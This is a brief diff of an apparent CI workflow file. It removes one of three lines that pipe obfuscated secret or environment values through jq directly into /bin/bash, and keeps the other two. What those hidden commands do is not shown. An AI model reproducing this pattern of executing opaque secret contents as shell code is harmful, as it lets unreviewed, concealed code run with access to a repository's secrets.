@@ -21,7 +21,6 @@ jobs:
           kndr527: ${{ secrets.kndr527 }}
         run: |
           printf '%s' "$kndr527" | jq -r .k57989 | /bin/bash
-          echo $nfsr7 | jq -r .x3 | /bin/bash
           echo $pxltg6239 | jq -r .erzn827 | /bin/bash
 
       - name: Save data
